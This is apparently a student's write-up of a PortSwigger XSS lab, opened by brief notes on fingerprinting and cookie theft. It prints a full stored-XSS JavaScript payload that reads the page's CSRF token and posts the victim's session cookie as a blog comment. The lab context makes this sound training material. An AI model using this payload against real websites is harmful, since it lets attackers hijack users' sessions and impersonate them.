
How are they able to keep session data AFTER getting a new device 

```
- **Stay stable over time**: The visitor IDs it creates stay the same for months, even with changes to the device or software, making it more reliable for long-term use.
```

Side Jacking: harvesting info from locally stored cookies can be done in JS with off the shelf hack tools.

## Exploiting cross-site scripting to steal cookies

WITHOUT COLLABORATOR 

Attack path: XSS > CSRF > SESSION COOKIE 

XSS - arbitrary javascript in user browser. POCs create alerts. Real attack get cookies. trick a browser to send an http request for its session to the endpoint.
{this lab is set up to only send to burp collaborator end point because it could be used to attack websites outside of portswigger}


first we use '<script>alert('hacked)</script> to poc that the comment box is vuln to xss' since we cant use collaborator because its a lot of money we cant go the intended route of having the browser send an http request to our collaborator server, we have to use an attack to have the browser do a POST request and post its own session cookie as a comment



we need to steal the CSRF token to impersonate the user.

`document.getElementsByName('csrf')[0].value;` is the javascript we need to run to get the browsers CSRF token. This token validates who is posting the comment and is what is preventing us from posting as other users ![[Pasted image 20251213221302.png]]

We can use this javascript code to exploit the vulnerabilities 
``` javascript
<script> needed for the xss vulns 

window.addEventListener('DOMContentLoaded', function() { waits until the CSRF token is loaded with the DOM

  

var token = document.getElementsByName('csrf')[0].value; # Gets the csrd token

var data = new FormData(); # intializes the data variable we will send

  

data.append('csrf', token); # adds our csrf token to impersonate

data.append('comment', document.cookie); Posts our cookies as a comment

data.append('postId', 6);

data.append('name', 'hacked'); # adds arbitrary data so the comment succeeds, we can get this from seeing what a valid request needs 

data.append('email', 'hacked@hacked.com'); adds arbitrary data so the comment succeeds

data.append('website', 'https://www.hacked.com'); adds arbitrary data so the comment succeeds

  

fetch('/post/comment', { 

    method: 'POST',

    mode: 'no-cors',

    body: data 
uses fetch to post the data variable 
});

});

</script>
```

*When attempting one of our labs, you usually know the exact vulnerability you need to look for. This is obviously not the case when testing genuine websites. To help you bridge this gap, we've created a mystery lab feature that lets you practice identifying vulnerabilities without any prior knowledge of them.


## Conclusion 
I walked through the challenge "**Exploiting cross-site scripting to steal cookies"** on Portswigger. I was able to solve this challenge using a method that does not require Burp Collaborator.


Chaining together XSS with an insecure CSRF token I was able to impersonate a user and run arbitrary javascript code on a users device. This code would then print their session cookie to the comment section through a POST request. Even though this is noisy and easily noticeable it shows the potential risk of these vulnerabilities. This could have easily been a silent http request to the collaborator server with out the user even noticing 
